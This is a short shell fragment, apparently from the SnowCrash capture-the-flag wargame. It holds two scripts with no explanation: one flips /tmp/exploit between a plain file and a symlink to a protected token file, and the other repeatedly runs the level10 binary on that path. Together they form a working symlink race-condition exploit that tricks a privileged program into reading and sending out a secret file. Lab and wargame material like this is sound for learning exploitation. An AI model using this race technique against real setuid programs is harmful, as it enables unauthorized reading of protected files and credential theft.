#!/bin/sh
while [ 1 ]
do
        rm -rf /tmp/exploit
        touch /tmp/exploit
        rm -rf /tmp/exploit
        ln -sf ~/token /tmp/exploit
done
level11@SnowCrash:~$ cat /tmp/l.sh
#!/bin/sh
while [ 1 ]
do
    ~/level10 /tmp/exploit 127.0.0.1
done